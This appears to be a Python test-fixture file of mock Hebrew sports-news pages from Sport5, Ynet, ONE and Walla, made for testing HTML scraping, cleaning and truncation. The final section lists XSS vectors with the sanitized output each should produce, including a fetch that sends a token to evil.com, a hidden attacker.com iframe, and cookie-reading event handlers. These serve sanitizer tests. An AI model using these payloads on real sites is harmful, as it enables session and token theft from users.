"""Authentic mock HTML fixtures for Israeli sports portals (Sport5, Ynet, ONE, Walla).

Includes dirty HTML with scripts/ads/tracking elements, long articles (> 3500 chars)
for truncation verification, and malicious HTML/XSS vectors for sanitization tests.
"""

# ---------------------------------------------------------------------------
# 1. Sport5 Standard & Long / Dirty HTML Fixtures
# ---------------------------------------------------------------------------

SPORT5_ARTICLE_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>ניצחון ענק: מכבי תל אביב גברה 82:86 על ריאל מדריד ביורוליג - ערוץ הספורט</title>
    <meta name="description" content="תצוגת ענק של הצהובים בהיכל מנורה מבטחים">
    <meta property="og:title" content="ניצחון ענק: מכבי תל אביב גברה 82:86 על ריאל מדריד ביורוליג">
    <meta property="og:site_name" content="אתר ערוץ הספורט">
</head>
<body>
    <header class="header-nav">
        <nav><a href="/">ראשי</a> | <a href="/israel">כדורגל ישראלי</a> | <a href="/euroleague">יורוליג</a></nav>
    </header>
    <main class="article-page">
        <h1 class="art-title">ניצחון ענק: מכבי תל אביב גברה 82:86 על ריאל מדריד ביורוליג</h1>
        <div class="art-meta">
            <span class="author">עמרי פולק</span>
            <span class="date">29.08.26 | 13:45</span>
        </div>
        <div class="art-body">
            <p class="lead">תצוגת ענק של הצהובים בהיכל מנורה מבטחים הבטיחה ניצחון יוקרתי ומקום בפלייאוף.</p>
            <p>חניכיו של עודד קטש הציגו כדורסל מלהיב ומחויב החל מהרבע הראשון. ווייד בולדווין להט עם 24 נקודות ו-7 אסיסטים, בעוד לורנזו בראון שלט בקצב והוסיף 18 נקודות משלו.</p>
            <p>ריאל מדריד, מוליכת המפעל, ניסתה לחזור ברבע השלישי בעזרת תצוגה של וולטר טבארס מתחת לסלים, אך הגנה קשוחה של ג'וש ניבו וחטיפות קריטיות של בונזי קולסון סגרו את הסיפור בדקות הסיום לקול תשואות 11,000 צופים נלהבים ביציעים.</p>
        </div>
    </main>
    <footer>
        <p>&copy; 2026 כל הזכויות שמורות לערוץ הספורט בע"מ</p>
    </footer>
</body>
</html>"""

# Generate long body text > 3500 characters to test strict truncation
_LONG_HEBREW_PARAGRAPH = (
    "המשחק נפתח בקצב מסחרר כאשר שתי הקבוצות הפגינו יכולת קליעה מרשימה מעבר לקשת השלוש. "
    "מכבי תל אביב לחצה לכל אורך המגרש וגרמה לאיבודי כדור מרובים של הספרדים. "
    "קטש ביצע חילופים מהירים ושמר על רמת אנרגיה גבוהה לאורך כל ארבעים הדקות. "
    "הקהל הצהוב מילא את ההיכל באווירה מחשמלת שלא נראתה מזה זמן רב בתל אביב. "
    "השליטה בריבאונד ההתקפה הייתה הגורם המכריע שאפשר למארחת לייצר נקודות בהזדמנות שנייה. "
    "בסיום המשחק הודה המאמן לשחקניו על ההקרבה וההתמדה לאורך כל שלבי ההתמודדות הקשה. "
)

SPORT5_LONG_ARTICLE_HTML = f"""<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>ניתוח מעמיק: איך מכבי תל אביב פירקה את ריאל מדריד - ערוץ הספורט</title>
</head>
<body>
    <div id="banner-ad" style="display:block;">פרסומת מסחרית</div>
    <script type="text/javascript">
        console.log("Tracking user impressions on Sport5");
        var tracker = {{ id: "user_9921", site: "sport5" }};
    </script>
    <article class="article-content">
        <h1>ניתוח מעמיק: איך מכבי תל אביב פירקה את ריאל מדריד</h1>
        <div class="article-body">
            <p>פתיחת הניתוח המקצועי של הניצחון הגדול ביורוליג.</p>
            {"".join(f"<p>{_LONG_HEBREW_PARAGRAPH} (פסקה {i+1})</p>" for i in range(25))}
        </div>
    </article>
    <iframe src="https://ads.sport5.co.il/embed"></iframe>
</body>
</html>"""

SPORT5_DIRTY_HTML = """<!DOCTYPE html>
<html lang="he">
<head>
    <title>מכבי חיפה מתכוננת לעונה החדשה</title>
    <script>eval("malicious_code()");</script>
    <style>body { font-family: sans-serif; background: #eee; } .ad { color: red; }</style>
</head>
<body>
    <div class="banner top-ad"><a href="http://spam.example.com"><img src="ad.jpg" alt="קנה עכשיו"></a></div>
    <script src="https://cdn.tracker.com/pixel.js"></script>
    <div class="content-wrapper">
        <h1 class="main-title">מכבי חיפה: ברק בכר מגבש את ה-11 לפתיחת הליגה</h1>
        <div class="author-box">מאת: תומר לוי</div>
        <!-- start content -->
        <p>הירוקים הגבירו את קצב האימונים לקראת המפגש הקרוב. עלי מוחמד שב לפעילות מלאה.</p>
        <div class="in-article-ad"><p>פרסומת: הירשמו למנוי שנתי מוזל!</p></div>
        <p>במועדון מרוצים מאוד מקצב ההתאקלמות של שחקני הרכש החדשים ומקווים לפתוח את העונה ברגל ימין.</p>
        <!-- end content -->
    </div>
    <div class="comments-section"><p>תגובות גולשים (120)</p></div>
    <iframe src="http://tracker.com/pixel" width="1" height="1"></iframe>
</body>
</html>"""

SPORT5_NEWSROOM_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>חדר המבזקים - ערוץ הספורט</title>
</head>
<body>
    <div class="newsroom-page">
        <h1>חדר מבזקים בזמן אמת</h1>
        <div class="newsroom-list">
            <div class="newsroom-item">
                <span class="time">14:30</span>
                <a href="/articles.aspx?FolderID=4453&docID=5001" class="title">
                    <h3>מנצ'סטר סיטי סיכמה על צירופו של קשר נבחרת ספרד</h3>
                </a>
                <p class="desc">אלופת אנגליה תשלם 60 מיליון יורו עבור הכוכב הצעיר.</p>
            </div>
            <div class="newsroom-item">
                <span class="time">13:45</span>
                <a href="/articles.aspx?FolderID=4439&docID=5002" class="title">
                    <h3>מכבי חיפה השלימה את עסקת השאלתו של החלוץ</h3>
                </a>
                <p class="desc">החלוץ יצטרף לאימונים כבר מחר בבוקר.</p>
            </div>
        </div>
    </div>
</body>
</html>"""

SPORT5_SECTION_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>כדורסל ישראלי ועולמי - ערוץ הספורט</title>
</head>
<body>
    <div class="category-page">
        <div class="main-article">
            <a href="https://www.sport5.co.il/articles.aspx?FolderID=4467&docID=5003">
                <img src="/images/maccabi.jpg" alt="מכבי תל אביב">
                <h2 class="title">ניצחון ענק למכבי תל אביב על ריאל מדריד ביורוליג</h2>
            </a>
        </div>
        <div class="art-item">
            <a href="/articles.aspx?FolderID=4467&docID=5004">
                <span class="title">הפועל ירושלים החתימה גארד אמריקאי מוביל</span>
            </a>
        </div>
    </div>
</body>
</html>"""

# ---------------------------------------------------------------------------
# 2. Ynet Sports HTML Fixtures
# ---------------------------------------------------------------------------

YNET_ARTICLE_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>סערה בבית"ר ירושלים: החלוץ הזר הודיע על עזיבה מיידית - ynet ספורט</title>
    <meta property="og:site_name" content="ynet">
</head>
<body>
    <div class="site-header">חדשות ynet ספורט</div>
    <div class="article-container">
        <h1 class="main-title">סערה בבית"ר ירושלים: החלוץ הזר הודיע על עזיבה מיידית</h1>
        <div class="article-sub-title">השחקן דרש שחרור ללא תמורה לקבוצה בטורקיה. ברק אברמוב סירב בתוקף.</div>
        <div class="article-text">
            <p>זעזוע בבירה יומיים בלבד לפני משחק העונה מול מכבי תל אביב בטדי.</p>
            <p>החלוץ לא הגיע לאימון הבוקר ושלח מכתב באמצעות עורך דינו בדרישה להתיר את חוזהו. בבית"ר הבהירו כי ינקטו בצעדים משפטיים חריפים במידה ולא ישוב לאימונים לאלתר.</p>
        </div>
    </div>
</body>
</html>"""

YNET_LONG_ARTICLE_HTML = f"""<!DOCTYPE html>
<html lang="he">
<head><title>תחקיר עומק ב-ynet ספורט</title></head>
<body>
    <div class="article-details">
        <h1>תחקיר: מצב הכדורגל הישראלי לקראת העשור הבא</h1>
        <div class="text_editor_paragraph">
            {"".join(f"<p>{_LONG_HEBREW_PARAGRAPH} (חלק {i+1})</p>" for i in range(20))}
        </div>
    </div>
</body>
</html>"""

YNET_DIRTY_HTML = """<!DOCTYPE html>
<html>
<head><title>ynet ספורט - עדכונים</title></head>
<body>
    <script>window.dataLayer = window.dataLayer || [];</script>
    <div id="taboola-below-article-thumbnails"></div>
    <div class="article-content">
        <h1>הפועל תל אביב החתימה זר חדש</h1>
        <p>הפועל תל אביב סיכמה עם הגארד האמריקאי לעונה אחת עם אופציה לשנה נוספת.</p>
        <p><a href="javascript:alert('injected')">לחץ כאן לפרטים נוספים</a></p>
    </div>
    <div class="outbrain-feed">מבזקים נוספים</div>
</body>
</html>"""

# ---------------------------------------------------------------------------
# 3. ONE Sports HTML Fixtures
# ---------------------------------------------------------------------------

ONE_ARTICLE_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>פרסום ראשון: הפועל באר שבע פתחה במו"מ עם קשר נבחרת רומניה - ONE</title>
</head>
<body>
    <div class="one-wrap">
        <h1 class="art-title">פרסום ראשון: הפועל באר שבע פתחה במו"מ עם קשר נבחרת רומניה</h1>
        <div class="one-content">
            <p>אלונה ברקת נותנת אור ירוק למהלך המרכזי של חלון ההעברות בטרנר.</p>
            <p>הקשר בן ה-26, שהרשים ביורו האחרון, מבוקש על ידי רן קוז'וך שמעוניין לחזק את מרכז השדה של מחזיקת הגביע.</p>
        </div>
    </div>
</body>
</html>"""

ONE_LONG_ARTICLE_HTML = f"""<!DOCTYPE html>
<html>
<head><title>ONE - כתבת מגזין ארוכה</title></head>
<body>
    <div class="article">
        <h1>סיפורו של מועדון: הפועל באר שבע</h1>
        <div class="content">
            {"".join(f"<p>{_LONG_HEBREW_PARAGRAPH} (קטע {i+1})</p>" for i in range(22))}
        </div>
    </div>
</body>
</html>"""

ONE_DIRTY_HTML = """<!DOCTYPE html>
<html>
<body>
    <div class="one-ad-slot">פרסומת עליונה</div>
    <script>document.write("<div class='ad'></div>");</script>
    <div class="article-text">
        <h1>מנור סולומון נפצע בקרסול וייעדר כחודש</h1>
        <p>מכה קשה לנבחרת ישראל לקראת המשחקים הקרובים בליגת האומות.</p>
        <script>sendAnalytics();</script>
        <p>השחקן יעבור הליך שיקום מזורז באנגליה בתקווה לחזור לפעילות לקראת הדרבי הלונדוני.</p>
    </div>
</body>
</html>"""

WALLA_ARTICLE_HTML = """<!DOCTYPE html>
<html lang="he" dir="rtl">
<head><title>וואלה! ספורט - ג'ודו</title></head>
<body>
    <article>
        <h1>מדליית זהב היסטורית לנבחרת הג'ודו של ישראל</h1>
        <div class="article-content">
            <p>הישג מופלא בטביליסי: פיטר פלצ'יק ורז הרשקו כיכבו בקרבות המכריעים.</p>
        </div>
    </article>
</body>
</html>"""

# ---------------------------------------------------------------------------
# 4. Malicious XSS / Security Test Vectors
# ---------------------------------------------------------------------------

MALICIOUS_XSS_HTML_SAMPLES = [
    (
        "<script>alert('XSS Attack!')</script><h1>כותרת ספורט</h1><p>גוף הכתבה ללא תגים זדוניים.</p>",
        "כותרת ספורט",
        "גוף הכתבה ללא תגים זדוניים.",
    ),
    (
        "<p>שחקן חתם בקבוצה <img src='x' onerror='alert(document.cookie)'> לעונה אחת.</p>",
        "כותרת",
        "שחקן חתם בקבוצה לעונה אחת.",
    ),
    (
        "<a href='javascript:void(0)' onclick='fetch(\"http://evil.com/steal?token=\"+localStorage.token)'>לחץ כאן לצפייה</a>",
        "כותרת",
        "לחץ כאן לצפייה",
    ),
    (
        "<iframe src='http://attacker.com/malware.html' width='0' height='0'></iframe><style>body{display:none;}</style><p>טקסט אמיתי בלבד</p>",
        "כותרת",
        "טקסט אמיתי בלבד",
    ),
    (
        "<b onmouseover='alert(1)'>מכבי תל אביב</b> ניצחה <svg onload='alert(2)'></svg> במשחק העונה",
        "כותרת",
        "מכבי תל אביב ניצחה במשחק העונה",
    ),
]
